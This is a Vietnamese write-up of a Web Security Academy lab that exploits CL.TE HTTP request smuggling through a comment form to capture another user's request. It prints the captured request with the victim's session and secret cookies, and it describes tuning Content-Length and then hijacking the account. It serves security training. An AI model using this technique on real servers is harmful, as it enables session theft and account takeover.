## Exploiting HTTP request smuggling to capture other users' requests

1. Khai thác smuggling ở chức năng comment, tiến hành khai thác CL.TE để store request tiếp sau smuggling request vào param `comment`. (Ở đây csrf và session cố định)

2. Gửi request smuggling như sau:

![image](https://user-images.githubusercontent.com/80744099/227424469-654c4f4a-51fd-4c97-97ee-929d5d61e1ac.png)

3. ĐƯợc biết với mỗi POST request được gửi thì victim lại truy cập trang / 1 lần. Như vậy sau khi gửi request smuggling chờ cho victim access đến trang / là nội dung request của victim sẽ được store trong một comment mới.

![image](https://user-images.githubusercontent.com/80744099/227425035-537393a2-69d0-474b-8236-687068f497d1.png)

4. Khi đó, victim sẽ gửi một request được nối thêm như sau: 
```
POST /post/comment HTTP/1.1
Host: 0a4e009e033231b4c4e37d6000040055.web-security-academy.net
Cookie: session=Ajli7EQ709wPnysAGdgzwn9LQzcOknPq; session=3Gkwm0IOhCHifABpnFg23C79CrbwSsXf
Content-Length: 945

csrf=h28CwhpdbMdRekRZgZUzl1QLpbu6xhXp&postId=8&name=manhcuong&email=cuong9cm@gmail.com&website=https://google.com&comment=GET / HTTP/1.1 Host: 0a4e009e033231b4c4e37d6000040055.web-security-academy.net cache-control: max-age=0 sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "Linux" upgrade-insecure-requests: 1 user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 sec-fetch-site: none sec-fetch-mode: navigate sec-fetch-user: ?1 sec-fetch-dest: document accept-encoding: gzip, deflate, br accept-language: en-US,en;q=0.9 cookie: victim-fingerprint=5i3wv1oIDU6iOiQofgPwzIx2Rn1Kun5p; secret=AcpMqNz1uQ4NV5ssIJcQqXihJrLpd9Xo; session=wFGlS6I85w3gj3puhvKoQIF0oIYLfXTW Co
```

5. Sau nhiều lần thử thì xác định được độ dài `Content-Length` để hiển thị đủ cookie của victim là 945

6. Edit giá trị cookie của access account của victim.
